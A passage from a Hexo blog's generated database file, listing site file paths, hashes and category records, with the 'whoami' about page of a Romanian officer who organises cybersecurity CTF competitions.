ba49820326df3b374d5d517d3cea99b","modified":1727072831664},{"_id":"public/tags/GCP/index.html","hash":"114adc24159e7cc8085e7226817c278b53b634ac","modified":1727072831664},{"_id":"public/tags/CTFd/index.html","hash":"7b54b0da196155ffbeeb0481d864395c0db0d5ae","modified":1727072831664},{"_id":"public/tags/Kubernetes/index.html","hash":"5e50fca56bb97ddeea5534cbb8d3f24cd93daab4","modified":1727072831664},{"_id":"public/tags/Docker/index.html","hash":"73b55d938051e9d3f2904f6099703c784ab0a417","modified":1727072831664},{"_id":"public/tags/Scripts/index.html","hash":"c4218832aa6c210d8d51a6ab953a53deb2574f3a","modified":1727072831664},{"_id":"public/categories/index.html","hash":"52a895e4064b1920f56eddfa13fe2df177aef443","modified":1727072831664},{"_id":"public/about/index.html","hash":"94fd82ba5b7d0e922adf2fbf8a61a862d6ccede7","modified":1727072831664},{"_id":"public/tags/index.html","hash":"4ba44ecdc30c4cb2d9045438c40583f10cf83e1c","modified":1727072831664},{"_id":"public/Pentesting/Windows/learning-resources/index.html","hash":"9cc892d2e84e6a00142320523be161ce78c0f527","modified":1727072831664},{"_id":"public/Pentesting/Windows/6/index.html","hash":"8880ac9c68c76feeee99eb8ff21d47e34542cd94","modified":1727072831664},{"_id":"public/Pentesting/Windows/5/index.html","hash":"15dc74ce5dbe0b538ad21c930d821529e7a4220e","modified":1727072831664},{"_id":"public/Pentesting/Windows/4/index.html","hash":"5c73480f711f98fe21f4f8b0538584a0746794c0","modified":1727072831664},{"_id":"public/Pentesting/Windows/3/index.html","hash":"adc0a7f624e7c771bd188fe1bef96c0a48e2dc2a","modified":1727072831664},{"_id":"public/Pentesting/Windows/2/index.html","hash":"b22727f55471eb8aec57d8c23b5278b2ad8bac5c","modified":1727072831664},{"_id":"public/Pentesting/Windows/1/index.html","hash":"01181f558ce57a4b48989d22f9a82860771861fb","modified":1727072831664},{"_id":"public/Pentesting/Attack-defense/index/index.html","hash":"b7055ce2a3fb779003d72425bef11eddc2f2d5d6","modified":1727072831664},{"_id":"public/CTFs/CSCTF 2024/4. Lessons learned/index/index.html","hash":"8e90c355fb3894d8dd5b8f9871a6178dd6760d75","modified":1727072831664},{"_id":"public/CTFs/CSCTF 2024/3. Community/2/index.html","hash":"ea29dd2de11616db75f085e081bfd09fc4170a89","modified":1727072831664},{"_id":"public/CTFs/CSCTF 2024/3. Community/1/index.html","hash":"17dae0d2997604caa4f0425e9cf7f7fca23e06d0","modified":1727072831664},{"_id":"public/CTFs/CSCTF 2024/2. Challenges/3/index.html","hash":"e8072286d49b4401ccd8a5705de903d36dc1165b","modified":1727072831664},{"_id":"public/CTFs/CSCTF 2024/2. Challenges/2/index.html","hash":"091e1b15f59c77489eae47dcf5ed4100e8ecafe1","modified":1727072831664},{"_id":"public/CTFs/CSCTF 2024/2. Challenges/1/index.html","hash":"1735be07dbb5216f7864487630f01a26ae897cd5","modified":1727072831664},{"_id":"public/CTFs/CSCTF 2024/1. Infrastructure/5/index.html","hash":"fb4be0e3b298fdb320bcaad7486b9bfa877b8830","modified":1727072831664},{"_id":"public/CTFs/CSCTF 2024/1. Infrastructure/4/index.html","hash":"37d2a906a5d489c19689dde6ec928362211d2904","modified":1727072831664},{"_id":"public/CTFs/CSCTF 2024/1. Infrastructure/2/index.html","hash":"1320217e99c7295f8915f815070a6eba44b5d747","modified":1727072831664},{"_id":"public/CTFs/CSCTF 2024/1. Infrastructure/3/index.html","hash":"e289dc6721158e628660c41d529bbcd67816c9d6","modified":1727072831664},{"_id":"public/CTFs/CSCTF 2024/1. Infrastructure/1/index.html","hash":"960791fd430758d3b1233c06b1f5f4702121978e","modified":1727072831664},{"_id":"public/CTFs/CSCTF 2024/0. Introduction/index/index.html","hash":"6807628156be950870308f2ca978760f15cdbad4","modified":1727072831664},{"_id":"public/Blog/hexo-next-git-pages-cloudflare/index.html","hash":"997757ecc5bfd8ccfd4410a6656f0f30096c13c5","modified":1727072831664},{"_id":"public/CTFs/ixodron/intro/index.html","hash":"bb70614fd2dd474451916595c7e325db64fa4338","modified":1727072831664},{"_id":"public/CTFs/ixodron/Demo/1/index.html","hash":"a692f3b7ba9550a85b175ae45a53dd4ccc88a3ff","modified":1727072831664},{"_id":"public/CTFs/ixodron/Demo/2/index.html","hash":"0a1c26d0bdbfeac08ad715766b15f808d9f364a2","modified":1727072831664},{"_id":"public/CTFs/ixodron/ctf/index.html","hash":"d9d454409c363bb5ea2aefd78eaafb7903659b24","modified":1727072831664},{"_id":"public/Pentesting/Linux/other/index.html","hash":"65206d445548792a2deb705fac970af90eacfea4","modified":1727072831664},{"_id":"public/Pentesting/Windows/commands/index.html","hash":"033c34adbbc4e2cc0e020e7bd9b942b909d526f6","modified":1727072831664},{"_id":"public/Pentesting/Windows/good-commands/index.html","hash":"265f4d0b1ef3556fc9d4e87c44efe3ee5ced5967","modified":1727072831664},{"_id":"public/Pentesting/Windows/services/index.html","hash":"cb6df242fa8ec027a19968d18de014d22e112470","modified":1727072831664},{"_id":"public/Pentesting/Linux/restricted-environment/index.html","hash":"cb6b1ce1b44723f994c27eb5d094b431b8bf59ff","modified":1727072831664},{"_id":"public/Pentesting/Linux/pivot-tunnel-and-send-files/index.html","hash":"3c4a9c21273bc9169de797eba1f1eb0ad7536298","modified":1727072831664},{"_id":"public/Pentesting/Linux/7/index.html","hash":"0661a44c89406bb67c240af012cdb76ee82ee9dd","modified":1727072831664},{"_id":"public/Pentesting/Linux/6/index.html","hash":"1576590a3a007fd152dd2fc30db632d259eb1432","modified":1727072831664},{"_id":"public/Pentesting/Linux/5/index.html","hash":"898794b909e3261cd85900e158e7c08b457614ce","modified":1727072831664},{"_id":"public/Pentesting/Linux/4/index.html","hash":"717a501e921aabe55ba55b41395a26899b9e93fc","modified":1727072831664},{"_id":"public/Pentesting/Linux/3/index.html","hash":"8e657006431aa6712a4a7f9fb36a8ed0df483336","modified":1727072831664},{"_id":"public/Pentesting/Linux/2/index.html","hash":"20fac822085ffacfff838a45e21b74e35c259e18","modified":1727072831664},{"_id":"public/Pentesting/Linux/1/index.html","hash":"bf30f2b3423bd777c6e788994f43e59d83f24445","modified":1727072831664},{"_id":"public/Pentesting/Linux/learning-resources/index.html","hash":"72bc5eca491b1f4fccfcd3eb16a50d8e8740dd8b","modified":1727072831664},{"_id":"public/categories/Pentesting/index.html","hash":"a8c5e8ec3cc253110f5b0da13ff70cd0c9c130f3","modified":1727072831664},{"_id":"public/categories/Pentesting/Linux/index.html","hash":"3b5d8f0cbd7b67f25aa0867974fbd0de55a82e6c","modified":1727072831664},{"_id":"public/categories/CTFs/index.html","hash":"aa6105604cf0dc5d3bb370213d242c5659db1c71","modified":1727072831664},{"_id":"public/categories/Pentesting/Windows/index.html","hash":"a501171b72dd65e28f480d77352f0f603362c7e2","modified":1727072831664},{"_id":"public/categories/CTFs/CSCTF-2024/index.html","hash":"de52a7535247de783c2085fbdee431c888ba861a","modified":1727072831664},{"_id":"public/categories/CTFs/ixodron-2024/index.html","hash":"dfc1d933cd75a50accddcc2281d6fc0536d581ee","modified":1727072831664},{"_id":"public/categories/CTFs/CSCTF-2024/1-Infrastructure/index.html","hash":"e0fef5cd5d1f68a014adc5d5460cca209265299a","modified":1727072831664},{"_id":"public/categories/CTFs/CSCTF-2024/2-Challenges/index.html","hash":"240bb39b36fc47746e17084ba5e4d6397116d4d7","modified":1727072831664},{"_id":"public/categories/CTFs/CSCTF-2024/3-Community/index.html","hash":"8b61cbbcb7c39815ad49425d745f43405dd95a07","modified":1727072831664},{"_id":"public/categories/CTFs/ixodron-2024/2-Demo/index.html","hash":"3545793af8b4ff9ce9ca845b35cc25124b71768e","modified":1727072831664},{"_id":"public/archives/index.html","hash":"011cb7008cc06fa8ee31915e9a1f3ad473e32c34","modified":1727072831664},{"_id":"public/archives/2024/index.html","hash":"8174f9c3198871db22aaf66ab3ba97d3803743ae","modified":1727072831664},{"_id":"public/archives/2024/08/index.html","hash":"3e53f18a79c9f7b15de3e0609cd18c685178b282","modified":1727072831664},{"_id":"public/archives/2024/09/index.html","hash":"80e1c8610e7941b08a9bbda09454ccc73bb438c5","modified":1727072831664},{"_id":"public/index.html","hash":"ce8b12070ffd73dbc4c6db78cbf5634d281fbbc9","modified":1727072831664},{"_id":"public/tags/Pentesting/index.html","hash":"ace42fddc751f56891a66766b33b56e641ba8cc9","modified":1727072831664},{"_id":"public/tags/Linux/index.html","hash":"a39bc7e376ff41ec063b4b0c0501b2dc6f7fc190","modified":1727072831664},{"_id":"public/tags/Preparation/index.html","hash":"f8fdccd2c828e6a21593fdf4f1595dbaa5906672","modified":1727072831664},{"_id":"public/tags/Windows/index.html","hash":"c14f4d56ee0a239b6915b56ad06dc5b8ccca3dd8","modified":1727072831664},{"_id":"public/tags/Internal-enumeration/index.html","hash":"206626c7792477d9c58c673f3a9cf209057349f6","modified":1727072831664},{"_id":"public/tags/Exploitation/index.html","hash":"a163b53ee85f07983441ffc8ae0235dc0399f71a","modified":1727072831664},{"_id":"public/tags/Reconnaissance/index.html","hash":"6c1c5943255b66f77969d24edb7de9888b9b8b40","modified":1727072831664},{"_id":"public/tags/Post-exploitation/index.html","hash":"752cba3e548eeb1121226647e49f8f00d2858846","modified":1727072831664},{"_id":"public/tags/Learning-Resources/index.html","hash":"564b5ce0da2d1adf5f9c05a36af50d61ca94176f","modified":1727072831664},{"_id":"public/tags/restricted-environment/index.html","hash":"52e21fde9286ea476511009b6e11df5933525b71","modified":1727072831664},{"_id":"public/tags/CTFs/index.html","hash":"f802a2f20af1de51e502ed8c0bdbc051cb0ba0af","modified":1727072831664},{"_id":"public/tags/ixodron-2024/index.html","hash":"71448b3e617e6e2b5dda9a66df285b9f261a8dd6","modified":1727072831664},{"_id":"public/tags/CSCTF-2024/index.html","hash":"b400733fca36953dd483d90dab756c4020a1831e","modified":1727072831664},{"_id":"public/tags/How-to-organize-a-CTF-competition/index.html","hash":"e4f5f6834268fdc0325a1c022048ce90a83f81bb","modified":1727072831664},{"_id":"public/tags/Challenges/index.html","hash":"1d9b8aa64375de80994177effa1d68683cfbb4e6","modified":1727072831664},{"_id":"public/tags/Community/index.html","hash":"e5e9d01b437ee10f17ff0fcee8b9f8b510839a34","modified":1727072831664},{"_id":"public/tags/Demo/index.html","hash":"38c996dcce5ab65e8c894b26e3f8e8d27caaaddc","modified":1727072831664},{"_id":"public/tags/Infrastructure/index.html","hash":"72d04c7ef2a9b91ab9ab880795e14494017c5146","modified":1727072831664},{"_id":"public/images/avatar.gif","hash":"2dbc3e2f2d624b2ca1afe6edc2ca17307f1950c8","modified":1727072831664},{"_id":"public/images/apple-touch-icon-next.png","hash":"2959dbc97f31c80283e67104fe0854e2369e40aa","modified":1727072831664},{"_id":"public/images/logo-algolia-nebula-blue-full.svg","hash":"b85e274207b1392782476a0430feac98db1e7da0","modified":1727072831664},{"_id":"public/images/favicon-32x32-next.png","hash":"0749d7b24b0d2fae1c8eb7f671ad4646ee1894b1","modified":1727072831664},{"_id":"public/images/logo.svg","hash":"099e11ab995a2c8981427a85476d082609848c77","modified":1727072831664},{"_id":"public/images/favicon-16x16-next.png","hash":"943a0d67a9cdf8c198109b28f9dbd42f761d11c3","modified":1727072831664},{"_id":"public/uploads/other/buymeacoffee-128.png","hash":"225da9cc0df2fc88b8f66b7abcc9a7b17a7e7242","modified":1727072831664},{"_id":"public/uploads/other/github-sponsor-128.jpg","hash":"fd2db12a64c83e11871fc3539db777adebcc8901","modified":1727072831664},{"_id":"public/uploads/other/paypal-128.png","hash":"2b99afc0292d73beb3f3c011e0217bb122bdb2b0","modified":1727072831664},{"_id":"public/css/noscript.css","hash":"4cd5301e478e0e0d4b176740ec314087ec5cb707","modified":1727072831664},{"_id":"public/js/comments-buttons.js","hash":"1a7344440321713426a0b2ab17e276b5bdf85ade","modified":1727072831664},{"_id":"public/js/bookmark.js","hash":"0f563ffbf05fad30e854e413ab17ff7164ab5a53","modified":1727072831664},{"_id":"public/js/comments.js","hash":"66ae2e26ea36a41b72c638ea8b220296638ae952","modified":1727072831664},{"_id":"public/js/config.js","hash":"4c4ebbe3b3f3841a26f9d5af6d0ba8bc6da01c54","modified":1727072831664},{"_id":"public/js/motion.js","hash":"8e587c086e3cf8687108fbb3241fe1534c3df463","modified":1727072831664},{"_id":"public/js/pjax.js","hash":"adc751f9b63b7a6b4d381506d35a1b3ff4de891f","modified":1727072831664},{"_id":"public/js/next-boot.js","hash":"8e2d589585f5270ee90285d3e65b69923c7629d8","modified":1727072831664},{"_id":"public/js/sidebar.js","hash":"b3289010a0cb52c525b1395db72bd463424f2f48","modified":1727072831664},{"_id":"public/js/schedule.js","hash":"a1333258726caf84f368a8f8454639c7dc1626bb","modified":1727072831664},{"_id":"public/js/third-party/addtoany.js","hash":"5276c8f78ee562a8965216dc67d762e59cb4a9f2","modified":1727072831664},{"_id":"public/js/third-party/fancybox.js","hash":"819f382c561fe5ec23c67cc5fabd63dd1cc22dc1","modified":1727072831664},{"_id":"public/js/third-party/quicklink.js","hash":"eed02e6fced8e5a653077205d4d4d7834ca71472","modified":1727072831664},{"_id":"public/js/third-party/pace.js","hash":"0ef04218b93561ba4d0ff420d556c3d90a756d32","modified":1727072831664},{"_id":"public/js/third-party/analytics/baidu-analytics.js","hash":"f629acc46ff40c071ffd31b77d5c7616f0fdd778","modified":1727072831664},{"_id":"public/js/third-party/analytics/google-analytics.js","hash":"def07bcc7c17d8a0caad177fb1dd2f3a5e5b3536","modified":1727072831664},{"_id":"public/js/third-party/analytics/growingio.js","hash":"78dd3cf04082b7dbe6246e404b2aa8e726922402","modified":1727072831664},{"_id":"public/js/third-party/analytics/matomo.js","hash":"c6a25b26a1443caa70b47fd3dfa282271574deb5","modified":1727072831664},{"_id":"public/js/third-party/chat/chatra.js","hash":"c32180522788c10e51df1803aa6842ef0432ddc9","modified":1727072831664},{"_id":"public/js/third-party/chat/tidio.js","hash":"b0079f6a4601e06ca6fe46e83a2f5af553e9bc3c","modified":1727072831664},{"_id":"public/js/third-party/comments/disqus.js","hash":"da361917d65e5dca8362f8cdeb6c8cc0e8316cec","modified":1727072831664},{"_id":"public/js/third-party/comments/gitalk.js","hash":"0ec038cf83e8ec067534f16a54041e47a3c1e59a","modified":1727072831664},{"_id":"public/js/third-party/comments/disqusjs.js","hash":"1e826dea3f684c0515f362dc1352447a1f0eae71","modified":1727072831664},{"_id":"public/js/third-party/comments/isso.js","hash":"753a873b6f566aff5ba77ca23f91b78eb880ca64","modified":1727072831664},{"_id":"public/js/third-party/comments/changyan.js","hash":"260d1a77d6a3bb33a579d3e4cca1997003e799b5","modified":1727072831664},{"_id":"public/js/third-party/comments/livere.js","hash":"2247d88c934c765c43013337860774aaa99f0b31","modified":1727072831664},{"_id":"public/js/third-party/math/katex.js","hash":"83c54ee536e487a1031783443fe0cb63b1b4767e","modified":1727072831664},{"_id":"public/js/third-party/comments/utterances.js","hash":"f67f90eb03e284c82da2b8cf2f1e31801813c16d","modified":1727072831664},{"_id":"public/js/third-party/math/mathjax.js","hash":"5c749b9c1c3bb738122d0516211ecff6496d4907","modified":1727072831664},{"_id":"public/js/third-party/search/algolia-search.js","hash":"fdb7b7cef1a147d897e7f7cd8903b58368ec2062","modified":1727072831664},{"_id":"public/js/third-party/search/local-search.js","hash":"4536cb6d0a9bbaaa86fab3fa0101f6a3a3ec5a76","modified":1727072831664},{"_id":"public/js/third-party/statistics/firestore.js","hash":"6e0682bb42170d61b13b786295f45f9c785f8b73","modified":1727072831664},{"_id":"public/js/third-party/statistics/lean-analytics.js","hash":"835cbf54c49ef1327f47df70ff2636ad36b6f57d","modified":1727072831664},{"_id":"public/js/third-party/tags/wavedrom.js","hash":"40dcd10df6edf124088c329346e0cc0bdac74ef1","modified":1727072831664},{"_id":"public/js/third-party/tags/pdf.js","hash":"af78c22f0e61c8c8aa8794e585e0d632c6d4fcb8","modified":1727072831664},{"_id":"public/js/third-party/tags/mermaid.js","hash":"6bf821310342c5b87a631873e7650a475a0765f1","modified":1727072831664},{"_id":"public/css/main.css","hash":"22dd4d188777cf40ac52896017fc22fa0464d786","modified":1727072831664},{"_id":"public/js/utils.js","hash":"f92420649b150703469bba41cbd5c72768beed88","modified":1727072831664},{"_id":"public/uploads/logo/windows-linux.png","hash":"4e7d545812dbf0e77308d274234dd71859881fe0","modified":1727072831664}],"Category":[{"name":"Blog","_id":"cm1emkmhf00046gvgaecj1ofx"},{"name":"Pentesting","_id":"cm1emkmhk000a6gvg079j5b6h"},{"name":"Linux","parent":"cm1emkmhk000a6gvg079j5b6h","_id":"cm1emkmhw000t6gvg7ci4gqt3"},{"name":"CTFs","_id":"cm1emkmij00336gvghyylb0n6"},{"name":"Attack-Defense","parent":"cm1emkmhk000a6gvg079j5b6h","_id":"cm1emkmil003d6gvg2bw2c38g"},{"name":"Windows","parent":"cm1emkmhk000a6gvg079j5b6h","_id":"cm1emkmio003n6gvg76f063rp"},{"name":"CSCTF 2024","parent":"cm1emkmij00336gvghyylb0n6","_id":"cm1emkmjg00686gvgc6endxje"},{"name":"ixodron 2024","parent":"cm1emkmij00336gvghyylb0n6","_id":"cm1emkmjh006d6gvgep1k9y5a"},{"name":"1. Infrastructure","parent":"cm1emkmjg00686gvgc6endxje","_id":"cm1emkmjp007r6gvg2x8h3gm7"},{"name":"1. Introduction","parent":"cm1emkmjh006d6gvgep1k9y5a","_id":"cm1emkmjp007t6gvg0lm08xjn"},{"name":"3. CTF","parent":"cm1emkmjh006d6gvgep1k9y5a","_id":"cm1emkmjs008d6gvg2s8p4yjy"},{"name":"0. Introduction","parent":"cm1emkmjg00686gvgc6endxje","_id":"cm1emkmjs008h6gvgd3vy1w7f"},{"name":"2. Challenges","parent":"cm1emkmjg00686gvgc6endxje","_id":"cm1emkmjt008n6gvg8fciczwe"},{"name":"4. Lessons learned","parent":"cm1emkmjg00686gvgc6endxje","_id":"cm1emkmjv00916gvg2iqbajw3"},{"name":"3. Community","parent":"cm1emkmjg00686gvgc6endxje","_id":"cm1emkmjv00966gvgexjghxc1"},{"name":"2. Demo","parent":"cm1emkmjh006d6gvgep1k9y5a","_id":"cm1emkmjx009j6gvg577shhih"}],"Data":[],"Page":[{"title":"Categories","sort":"name","type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: Categories\nsort: name\ntype: \"categories\"\n---","date":"2024-09-23T06:18:55.890Z","updated":"2024-09-23T06:18:55.890Z","path":"categories/index.html","comments":1,"layout":"page","_id":"cm1emkmh400006gvg4d8a49j6","content":"","excerpt":"","more":""},{"title":"whoami","type":"about","_content":"\n\n## Intro\n\nHello! My name is <a href=\"https://linkedin.com/in/radumarin001/\" target=\"_blank\"><b>Radu</b></a> and I am an officer in Romanian Army. I recently finished my studies at <a href=\"https://www.armyacademy.ro/\" target=\"_blank\"><b>\"Nicolae Balcescu\" Land Forces Academy</b></a> in Sibiu, specializing in military communication, information technology and cyber defense. I embarked on my cybersecurity journey in 2021, driven by a relentless thirst for knowledge, improvement, and a desire to contribute positively to the community.\n\nAt the moment, I am certified with `eJPT` and aspire to get the `OSCP` by the end of 2025. I am continually exploring, learning, and sharing insights in the expansive and dynamic realm of cybersecurity.\n\n<br>\n\n## 2 CTFs\n\nMy engagement with cybersecurity materialized through organizing Capture The Flag (CTF) competitions, aimed at challenging and educating participants in various aspects of cybersecurity. My inaugural event, <a href=\"/categories/CTFs/SMCC-2023\" target=\"_blank\"><b>Sibiu Military Cyber Challenge 2023</b> (SMCC 2023)</a>, was a beginner-intermediate level CTF designed for my peers in the military academy and high school in Sibiu, Romania.\n\nFollowing its success, I created the <a href=\"/categories/CTFs/CSCTF-2024/\" target=\"_blank\"><b>Chronos Security CTF 2024</b> CSCTF 2024</a>, a national competition welcoming participants across all educational levels, from high school to master's degree students, across military and civilian sectors, as well as other interested Romanian participants. The competition is structured to encourage learning, enhance skills, and foster a supportive community environment. This initiative not only served as a significant challenge but also as a comprehensive project for my bachelor thesis.\n\n<br>\n\n## Projects\n\nFrom July 2022 to July 2024 I had been developing a website based on **Notion** (awesome note-taking app). There, I posted writeups to CTFs and machines, cheatsheets, learning resources, tricks and tools, scripts, and explained how I created the first CTF, **SMCC 2023**. In the meantime, I also developed a cool script to automate the process of enumeration with `terminator` (<a href=\"https://github.com/ChronosPk/APET\" target=\"_\">APET</a>), published some <a href=\"https://github.com/ChronosPk/pentesting-cheatsheets\" target=\"_\">pentesting cheatsheets</a>, and some other smaller projects.\n\n<br>\n\n## Development\n\nIn the beginning, I liked every branch or cybersecurity, so I tried to learn everything. This strategy proved inefficient from its early days, after which I started taking predefined learning paths, like the ones offered by THM or Cisco. After *many* courses, countless studying hours, handful of pwned machines and solved CTF challenges, and whoever knows what else, I might be an advanced script kiddie (*everyone in cybersecurity, battling the <a href=\"https://en.wikipedia.org/wiki/Impostor_syndrome\" target=\"_\">impostor syndrome</a>*).\n\n<br>\n\n## Next steps\n\nAdditionally to getting the `OSCP`, I'm committed to creating more engaging and educational CTF competitions, contributing to cybersecurity awareness, and supporting the growth of this vibrant community. Looking forward to more pentesting, awareness and teaching!\n\n<br>\n\n## Socials\n\nI try to stay active on various platforms and I am always open to discussions, collaborations, or any form of engagement that propels our mutual growth. Feel free to connect with me through any of the following channels:\n<a href=\"https://www.linkedin.com/in/radumarin001/\" target=\"_blank\"><b>LinkedIn</b></a> | <a href=\"https://discordapp.com/users/602129324136464394\" target=\"_blank\"><b>Discord</b></a> | <a href=\"https://instagram.com/chronos_security\" target=\"_blank\"><b>Instagram</b></a>.\n\nAlso, you can find me on different cybersecurity or IT platforms:\n<a href=\"https://github.com/ChronosPK\" target=\"_blank\"><b>GitHub</b></a> | <a href=\"https://tryhackme.com/p/s.marin.ionut\" target=\"_blank\"><b>TryHackMe</b></a> | <a href=\"https://app.hackthebox.com/profile/691012\" target=\"_blank\"><b>HackTheBox</b></a> | <a href=\"https://play.picoctf.org/users/Radupk\" target=\"_blank\"><b>PicoCTF</b></a> | <a href=\"https://app.cyber-edu.co/user/89f41bb0-25ea-11ec-85ba-b5c17388972b\" target=\"_blank\"><b>CyberEDU</b></a>.\n\nIf needed, reach out via email at <a href=\"mailto:chronos@chronossec.site\"><b>chronos@chronossec.site</b></a>.\n\n<br>\n<br>\n\n> Any  actions and or activities related to the material contained within this Website is solely your responsibility.The misuse of the information in this website can result in criminal charges brought against the persons in question. The author of `chronossec.site` will not be held responsible in the event any criminal charges be brought against any individuals misusing the information in this website to break the law.\n\n<br>\n\n---\n---","source":"about/index.md","raw":"---\ntitle: \"whoami\"\ntype: \"about\"\n---\n\n\n## Intro\n\nHello! My name is <a href=\"https://linkedin.com/in/radumarin001/\" target=\"_blank\"><b>Radu</b></a> and I am an officer in Romanian Army. I recently finished my studies at <a href=\"https://www.armyacademy.ro/\" target=\"_blank\"><b>\"Nicolae Balcescu\" Land Forces Academy</b></a> in Sibiu, specializing in military communication, information technology and cyber defense. I embarked on my cybersecurity journey in 2021, driven by a relentless thirst for knowledge, improvement, and a desire to contribute positively to the community.\n\nAt the moment, I am certified with `eJPT` and aspire to get the `OSCP` by the end of 2025. I am continually exploring, learning, and sharing insights in the expansive and dynamic realm of cybersecurity.\n\n<br>\n\n## 2 CTFs\n\nMy engagement with cybersecurity materialized through organizing Capture The Flag (CTF) competitions, aimed at challenging and educating participants in various aspects of cybersecurity. My inaugural event, <a href=\"/categories/CTFs/SMCC-2023\" target=\"_blank\"><b>Sibiu Military Cyber Challenge 2023</b> (SMCC 2023)</a>, was a beginner-intermediate level CTF designed for my peers in the military academy and high school in Sibiu, Romania.\n\nFollowing its success, I created the <a href=\"/categories/CTFs/CSCTF-2024/\" target=\"_blank\"><b>Chronos Security CTF 2024</b> CSCTF 2024</a>, a national competition welcoming participants across all educational levels, from high school to master's degree students, across military and civilian sectors, as well as other interested Romanian participants. The competition is structured to encourage learning, enhance skills, and foster a supportive community environment. This initiative not only served as a significant challenge but also as a comprehensive project for my bachelor thesis.\n\n<br>\n\n## Projects\n\nFrom July 2022 to July 2024 I had been developing a website based on **Notion** (awesome note-taking app). There, I posted writeups to CTFs and machines, cheatsheets, learning resources, tricks and tools, scripts, and explained how I created the first CTF, **SMCC 2023**. In the meantime, I also developed a cool script to automate the process of enumeration with `terminator` (<a href=\"https://github.com/ChronosPk/APET\" target=\"_\">APET</a>), published some <a href=\"https://github.com/ChronosPk/pentesting-cheatsheets\" target=\"_\">pentesting cheatsheets</a>, and some other smaller projects.\n\n<br>\n\n## Development\n\nIn the beginning, I liked every branch or cybersecurity, so I tried to learn everything. This strategy proved inefficient from its early days, after which I started taking predefined learning paths, like the ones offered by THM or Cisco. After *many* courses, countless studying hours, handful of pwned machines and solved CTF challenges, and whoever knows what else, I might be an advanced script kiddie (*everyone in cybersecurity, battling the <a href=\"https://en.wikipedia.org/wiki/Impostor_syndrome\" target=\"_\">impostor syndrome</a>*).\n\n<br>\n\n## Next steps\n\nAdditionally to getting the `OSCP`, I'm committed to creating more engaging and educational CTF competitions, contributing to cybersecurity awareness, and supporting the growth of this vibrant community. Looking forward to more pentesting, awareness and teaching!\n\n<br>\n\n## Socials\n\nI try to stay active on various platforms and I am always open to discussions, collaborations, or any form of engagement that propels our mutual growth. Feel free to connect with me through any of the following channels:\n<a href=\"https://www.linkedin.com/in/radumarin001/\" target=\"_blank\"><b>LinkedIn</b></a> | <a href=\"https://discordapp.com/users/602129324136464394\" target=\"_blank\"><b>Discord</b></a> | <a href=\"https://instagram.com/chronos_security\" target=\"_blank\"><b>Instagram</b></a>.\n\nAlso, you can find me on different cybersecurity or IT platforms:\n<a href=\"https://github.com/ChronosPK\" target=\"_blank\"><b>GitHub</b></a> | <a href=\"https://tryhackme.com/p/s.marin.ionut\" target=\"_blank\"><b>TryHackMe</b></a> | <a href=\"https://app.hackthebox.com/profile/691012\" target=\"_blank\"><b>HackTheBox</b></a> | <a href=\"https://play.picoctf.org/users/Radupk\" target=\"_blank\"><b>PicoCTF</b></a> | <a href=\"https://app.cyber-edu.co/user/89f41bb0-25ea-11ec-85ba-b5c17388972b\" target=\"_blank\"><b>CyberEDU</b></a>.\n\nIf needed, reach out via email at <a href=\"mailto:chronos@chronossec.site\"><b>chronos@chronossec.site</b></a>.\n\n<br>\n<br>\n\n> Any  actions and or activities related to the material contained within this Website is solely your responsibility.The misuse of the information in this website can result in criminal charges brought against the persons in question. The author of `chronossec.site` will not be held responsible in the event any criminal charges be brought against any individuals misusing the information in this website to break the law.\n\n<br>\n\n---\n---","date":"2024-09-23T06:18:55.888Z","updated":"2024-09-23T06:18:55.888Z","path":"about/index.html","comments":1,"layout":"page","_id":"cm1emkmhd00026gvg71e8d3vm","content":"<h2 id=\"Intro\"><a href=\"#Intro\" class=\"headerlink\" title=\"Intro\"></a>Intro</h2><p>Hello! My name is <a href=\"https://linkedin.com/in/radumarin001/\" target=\"_blank\"><b>Radu</b></a> and I am an officer in Romanian Army. I recently finished my studies at <a href=\"https://www.armyacademy.ro/\" target=\"_blank\"><b>Nicolae Balcescu Land Forces Academy</b></a> in Sibiu, specializing in military communication, information technology and cyber defense. I embarked on my cybersecurity journey in 2021, driven by a relentless thirst for knowledge, improvement, and a desire to contribute positively to the community.</p>\n<p>At the moment, I am certified with <code>eJPT</code> and aspire to get the <code>OSCP</code> by the end of 2025. I am continually exploring, learning, and sharing insights in the expansive and dynamic realm of cybersecurity.</p>\n<br>\n\n<h2 id=\"2-CTFs\"><a href=\"#2-CTFs\" class=\"headerlink\" title=\"2 CTFs\"></a>2 CTFs</h2><p>My engagement with cybersecurity materialized through organizing Capture The Flag (CTF) competitions, aimed at challenging and educating participants in various aspects of cybersecurity. My inaugural event, <a href=\"/categories/CTFs/SMCC-2023\" target=\"_blank\"><b>Sibiu Military Cyber Challenge 2023</b> (SMCC 2023)</a>, was a beginner-intermediate level CTF designed for my peers in the military academy and high school in Sibiu, Romania.</p>\n<p>Following its success, I created the <a href=\"/categories/CTFs/CSCTF-2024/\" target=\"_blank\"><b>Chronos Security CTF 2024</b> CSCTF 2024</a>, a national competition welcoming participants across all educational levels, from high school to masters degree students, across military and civilian sectors, as well as other interested Romanian participants. The competition is structured to encourage learning, enhance skills, and foster a supportive community environment. This initiative not only served as a significant challenge but also as a comprehensive project for my bachelor thesis.</p>\n<br>\n\n<h2 id=\"Projects\"><a href=\"#Projects\" class=\"headerlink\" title=\"Projects\"></a>Projects</h2><p>From July 2022 to July 2024 I had been developing a website based on <strong>Notion</strong> (awesome note-taking app). There, I posted writeups to CTFs and machines, cheatsheets, learning resources, tricks and tools, scripts, and explained how I created the first CTF, <strong>SMCC 2023</strong>. In the meantime, I also developed a cool script to automate the process of enumeration with <code>terminator</code> (<a href=\"https://github.com/ChronosPk/APET\" target=\"_\">APET</a>), published some <a href=\"https://github.com/ChronosPk/pentesting-cheatsheets\" target=\"_\">pentesting cheatsheets</a>, and some other smaller projects.</p>\n<br>\n\n<h2 id=\"Development\"><a href=\"#Development\" class=\"headerlink\" title=\"Development\"></a>Development</h2><p>In the beginning, I liked every branch or cybersecurity, so I tried to learn everything. This strategy proved inefficient from its early days, after which I started taking predefined learning paths, like the ones offered by THM or Cisco. After <em>many</em> courses, countless studying hours, handful of pwned machines and solved CTF challenges, and whoever knows what else, I might be an advanced script kiddie (<em>everyone in cybersecurity, battling the <a href=\"https://en.wikipedia.org/wiki/Impostor_syndrome\" target=\"_\">impostor syndrome</a></em>).</p>\n<br>\n\n<h2 id=\"Next-steps\"><a href=\"#Next-steps\" class=\"headerlink\" title=\"Next steps\"></a>Next steps</h2><p>Additionally to getting the <code>OSCP</code>, Im committed to creating more engaging and educational CTF competitions, contributing to cybersecurity awareness, and supporting the growth of this vibrant community. Looking forward to more pentesting, awareness and 